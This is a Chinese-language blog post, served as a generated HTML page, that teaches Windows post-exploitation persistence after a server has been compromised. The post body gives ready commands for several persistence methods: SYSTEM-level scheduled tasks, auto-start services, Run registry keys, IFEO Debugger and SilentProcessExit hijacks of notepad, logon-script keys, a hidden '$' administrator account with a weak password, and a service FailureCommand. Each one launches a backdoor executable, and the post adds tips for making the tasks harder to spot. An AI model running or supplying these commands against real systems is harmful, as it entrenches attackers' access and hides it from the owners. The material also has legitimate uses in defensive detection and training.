@@ -1,0 +1,593 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-10-12 23:22" pubdate>
+        2022年10月12日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            <div class="markdown-body">
+              <h2 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h2><p>在获取到服务器权限后 通常会选择一些方式来进行我们的权限维持 以防止服务器重启之后或者其他情况下shell掉线</p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>利用计划任务进行权限维持</p>
+<h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h4><ul>
+<li>schtasks /?  参数详解</li>
+<li>schtasks /create /?  创建计划任务参数详解</li>
+</ul>
+<blockquote>
+<p>/sc   计划任务类型，可选值为MINUTE、HOURLY、DAILY、WEEKLY、ONCE、ONSTART、ONLOGON、ONIDLE、MONTHLY、ONEVENT<br>/tn   计划任务名称，后续查询、修改、删除、执行时使用<br>/tr   需要运行的程序或命令，传入的命令中间如果有空格会被截断为程序和参数，因此需要将双引号转义并传入。<br>/ru   运行任务的用户账户名，不使用此参数的话使用执行schtasks命令的账户运行计划任务<br>/rp   运行任务的用户账户密码<br>/mo   指定任务在计划类型中的运行间隔<br>/d    指定任务在一个月或者星期的某一天运行，只适用于MONTHLY和WEEKLY类型。<br>/m    指定任务在某个月运行，只适用于MONTHLY类型。<br>/i    当计划任务类型为ONIDLE时，运行任务前计算机处于空闲状态的分钟数。<br>st    当计划任务类型为MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY时使用，指定任务的开始时间，默认为本地计算机的当前时间。<br>/ri   指定计划任务的重复间隔，以分钟为单位。不适合计划类型：MINUTE、HOURLY、ONSTART、ONLOGON、ONIDLE<br>/et   指定计划任务的结束时间，适用于计划类型：MINUTE、HOURLY， 在指定的结束时间之后，schtasks 不会再次启动任务，除非当前系统时间调回开始时间。默认情况下，没有结束时间。<br>/du   指定任务计划的持续时间，与/et类似，默认情况下没有持续时间。<br>/k    在指定计划任务的结束时间或持续时间后停止任务，如果不加此参数，则在时间到了会继续运行或者重启该任务。<br>/it   只在用户登录时运行<br>/z    在任务计划完成后删除任务计划<br>/f    在创建任务时如果任务已存在不显示警告<br>/RL   为作业设置运行级别。有效值为LIMITED 和 HIGHEST。默认值为 LIMITED。<br>/F    如果指定的任务已经存在，则强制创建任务并抑制警告。</p>
+</blockquote>
+<p>1.创建一个test的计划任务 触发程序为ttt.exe 每分钟运行一次 高级别运行 权限为system</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">schtasks /create /tn <span class="hljs-string">&quot;test&quot;</span> /tr C:\Users\ttt\Desktop\ttt.exe /rl highest /F /sc minute /mo <span class="hljs-number">1</span> /RU system<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012221615597.png" srcset="/img/loading.gif" lazyload alt="image-20221012221615597"></p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012221711479.png" srcset="/img/loading.gif" lazyload alt="image-20221012221711479"></p>
+<p>可以看到已经上线了</p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012221838482.png" srcset="/img/loading.gif" lazyload alt="image-20221012221838482"></p>
+<p>这里面也可以看到  可以将任务名字改得正常一点 提高隐藏性</p>
+<p>现在将电脑关机 已经将cs里面会话的删掉</p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012222215251.png" srcset="/img/loading.gif" lazyload alt="image-20221012222215251"></p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012222232028.png" srcset="/img/loading.gif" lazyload alt="image-20221012222232028"></p>
+<p>不管用什么用户登录都直接上线</p>
+<p>但是测试的时候 发现最后要设置为system才执行上线  其他权限的不行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/create /</span>tn <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-regexp">/tr C:\Users\ttt\Desktop\ttt.exe /</span>rl highest <span class="hljs-regexp">/F /</span>sc minute <span class="hljs-regexp">/mo 1 /</span>RU system<br></code></pre></td></tr></table></figure>
+
+<p><strong>账号登录时上线</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/create /</span>tn test <span class="hljs-regexp">/tr C:\Users\ttt\Desktop\ttt.exe /</span>sc onlogon   如添加计划任务时使用的账号，登录成功后即上线<br></code></pre></td></tr></table></figure>
+
+<p><strong>删除计划任务</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/tn</span> test <span class="hljs-string">/f</span> <br></code></pre></td></tr></table></figure>
+
+<p>但运行中的不会中断</p>
+<p><strong>结束计划任务</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/end /</span>tn test<br></code></pre></td></tr></table></figure>
+
+<p><strong>运行计划任务</strong></p>
+<p>立即运行 但不会影响计划任务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>tn test<br></code></pre></td></tr></table></figure>
+
+<h3 id="注册自启动服务"><a href="#注册自启动服务" class="headerlink" title="注册自启动服务"></a>注册自启动服务</h3><p>我们可以把后门注册为自启服务  电脑启动后会自动执行自启服务</p>
+<p>创建名为test的服务（注意等号后面有空格），设置自启动，启动权限为system</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> create <span class="hljs-keyword">test</span> binpath= C:\Users\ttt\Desktop\ttt.exe start= auto obj= Localsystem<br>#启动服务<br><span class="hljs-keyword">net</span> start <span class="hljs-keyword">test</span><br>#查询服务<br><span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> <span class="hljs-keyword">test</span><br>#删除服务<br><span class="hljs-keyword">sc</span> delete <span class="hljs-keyword">tes</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012223958554.png" srcset="/img/loading.gif" lazyload alt="image-20221012223958554"></p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012224008157.png" srcset="/img/loading.gif" lazyload alt="image-20221012224008157"></p>
+<p>但是需要尽快进行迁移以免shell掉线</p>
+<h3 id="自启动注册表植入后门"><a href="#自启动注册表植入后门" class="headerlink" title="自启动注册表植入后门"></a>自启动注册表植入后门</h3><p>在每次开机完成后，计算机会自动遍历自启动注册表下的键值，获取键值中的程序路径，并创建进程启动程序，我们想要利用这个就需要修改注册表在键值存放我们的程序</p>
+<p>常见的注册表键值</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">#Run键<br>HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>ircosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br></code></pre></td></tr></table></figure>
+
+<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p>
+<p>添加键test，值为后门程序路径</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">REG ADD &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v test /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\t</span>tt<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>tt.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012224614658.png" srcset="/img/loading.gif" lazyload alt="image-20221012224614658"></p>
+<p>然后重启机器</p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012224820027.png" srcset="/img/loading.gif" lazyload alt="image-20221012224820027"></p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012224832345.png" srcset="/img/loading.gif" lazyload alt="image-20221012224832345"></p>
+<p>HKEY_CURRENT_USER\Software\Mircosoft\Windows\CurrentVersion\Run</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">REG ADD &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>ircosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v test /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\t</span>tt<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>tt.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>“映像劫持”，也被称为 “IFEO”（Image File Execution Options）。通过修改“Debugger“项值，替换执行程序，加以利用。</p>
+<p>劫持对应的程序后，打开该程序运行的是别的程序，比如运行A.exe打开的则是B.exe</p>
+<p>注册表路径为：</p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</p>
+<p>在注册表路径下创建一个项，项名为要劫持的exe名称，可以为任意一个可以运行的exe程序，包括安装后和未安装的exe。并在该项创建一个Debugger的键值（名字只能为Debugger），键值填运行的恶意exe</p>
+<p>对notepad++程序进行劫持</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\n</span>otepad++.exe&quot; /v Debugger /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\t</span>tt<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>tt.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012230447647.png" srcset="/img/loading.gif" lazyload alt="image-20221012230447647"></p>
+<p>然后点击nodepade++.exe</p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012230502663.png" srcset="/img/loading.gif" lazyload alt="image-20221012230502663"></p>
+<p>打不开</p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012230516019.png" srcset="/img/loading.gif" lazyload alt="image-20221012230516019"></p>
+<p>上线了</p>
+<h4 id="映像劫持新玩法"><a href="#映像劫持新玩法" class="headerlink" title="映像劫持新玩法"></a>映像劫持新玩法</h4><p>新的利用方法，实现的效果是：程序A静默退出结束后，会执行程序B。</p>
+<p>劫持notepad.exe</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\n</span>otepad.exe&quot;  /v GlobalFlag /t REG_DWORD /d 512<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\S</span>ilentProcessExit<span class="hljs-symbol">\n</span>otepad.exe&quot;  /v ReportingMode /t REG_DWORD /d 1<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\S</span>ilentProcessExit<span class="hljs-symbol">\n</span>otepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\t</span>tt<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>tt.exe&quot;<br><br></code></pre></td></tr></table></figure>
+
+<p>详细可参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/151425">https://www.anquanke.com/post/id/151425</a></p>
+<h3 id="logon-scripts-后门"><a href="#logon-scripts-后门" class="headerlink" title="logon scripts 后门"></a>logon scripts 后门</h3><p>Windows 登录脚本，当用户登录时触发</p>
+<p><strong>注册表位置</strong>：HKEY_CURRENT_USER\Environment </p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">REG ADD <span class="hljs-string">&quot;HKEY_CURRENT_USER\Environment&quot;</span> <span class="hljs-string">/v</span> UserInitMprLogonScript <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:\Users\ttt\Desktop\ttt.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="创建隐藏账号"><a href="#创建隐藏账号" class="headerlink" title="创建隐藏账号"></a>创建隐藏账号</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">net</span> user test<span class="hljs-number">1</span>$ <span class="hljs-number">123456</span> /add<br><span class="hljs-attribute">net</span> localgroup administrators test<span class="hljs-number">1</span>$ /add<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012231337904.png" srcset="/img/loading.gif" lazyload alt="image-20221012231337904"></p>
+<p><img src="/2022/10/12/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/渗透资料\github文章me\kerberos\image-20221012231352256.png" srcset="/img/loading.gif" lazyload alt="image-20221012231352256"></p>
+<p>net user看不见 但管理员里面可以看见 以及管理用户面板</p>
+<h3 id="失败命令"><a href="#失败命令" class="headerlink" title="失败命令"></a>失败命令</h3><p>Windows提供了一种功能，以便在服务无法启动或其通信过程终止时执行某些操作。具体来说，当服务被终止时，可以执行命令。控制此操作的注册表项是“ FailureCommand ”，其值将定义要执行的操作。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\S</span>ervices<span class="hljs-symbol">\W</span>32Time&quot; /v FailureCommand /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\t</span>tt<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>tt.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p>这样注册之后 我们将 win32time服务停止后 会执行ttt.exe</p>
+<p>详细可参考<a target="_blank" rel="noopener" href="https://hackergu.com/power-service/">https://hackergu.com/power-service/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/07/%E5%88%9D%E6%8E%A2java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">初探java反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/15/js%E4%B9%8B%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95/">
+                        <span class="hidden-mobile">js之逆向调试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
